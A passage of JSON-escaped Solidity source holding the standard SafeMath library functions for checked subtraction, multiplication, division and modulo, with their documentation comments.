on\n   * overflow (when the result is negative).\n   *\n   * Counterpart to Solidity\u0027s `-` operator.\n   *\n   * Requirements:\n   * - Subtraction cannot overflow.\n   */\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n    return sub(a, b, \"SafeMath: subtraction overflow\");\n  }\n\n  /**\n   * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n   * overflow (when the result is negative).\n   *\n   * Counterpart to Solidity\u0027s `-` operator.\n   *\n   * Requirements:\n   * - Subtraction cannot overflow.\n   */\n  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n    require(b \u003c= a, errorMessage);\n    uint256 c = a - b;\n\n    return c;\n  }\n\n  /**\n   * @dev Returns the multiplication of two unsigned integers, reverting on\n   * overflow.\n   *\n   * Counterpart to Solidity\u0027s `*` operator.\n   *\n   * Requirements:\n   * - Multiplication cannot overflow.\n   */\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n    // Gas optimization: this is cheaper than requiring \u0027a\u0027 not being zero, but the\n    // benefit is lost if \u0027b\u0027 is also tested.\n    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n    if (a == 0) {\n      return 0;\n    }\n\n    uint256 c = a * b;\n    require(c / a == b, \"SafeMath: multiplication overflow\");\n\n    return c;\n  }\n\n  /**\n   * @dev Returns the integer division of two unsigned integers. Reverts on\n   * division by zero. The result is rounded towards zero.\n   *\n   * Counterpart to Solidity\u0027s `/` operator. Note: this function uses a\n   * `revert` opcode (which leaves remaining gas untouched) while Solidity\n   * uses an invalid opcode to revert (consuming all remaining gas).\n   *\n   * Requirements:\n   * - The divisor cannot be zero.\n   */\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\n    return div(a, b, \"SafeMath: division by zero\");\n  }\n\n  /**\n   * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n   * division by zero. The result is rounded towards zero.\n   *\n   * Counterpart to Solidity\u0027s `/` operator. Note: this function uses a\n   * `revert` opcode (which leaves remaining gas untouched) while Solidity\n   * uses an invalid opcode to revert (consuming all remaining gas).\n   *\n   * Requirements:\n   * - The divisor cannot be zero.\n   */\n  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n    // Solidity only automatically asserts when dividing by 0\n    require(b \u003e 0, errorMessage);\n    uint256 c = a / b;\n    // assert(a == b * c + a % b); // There is no case in which this doesn\u0027t hold\n\n    return c;\n  }\n\n  /**\n   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n   * Reverts when dividing by zero.\n   *\n   * Counterpart to Solidity\u0027s `%` operator. This function uses a `revert`\n   * opcode (which leaves remaining gas untouched) while Solidity uses an\n   * invalid opcode to revert (consuming all remaining gas).\n   *\n   * Requirements:\n   * - The divisor cannot be zero.\n   */\n  function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n    return mod(a, b, \"SafeMath: modulo by zero\");\n  }\n\n  /**\n   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n   * Reverts with custom message when dividing by zero.\n   *\n   * Counterpart to Solidity\u0027s `%` operator. This function uses a `revert`\n   * opcode (which leaves remaining gas untouched) while Solidity uses an\n   * invalid opcode to revert (consuming all remaining gas).\n   *\n   * Requirements:\n   * - The divisor cannot be zero.\n   */\n  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n    require(b != 0, errorMessage);\n    return a % b;\n  }\n}"}}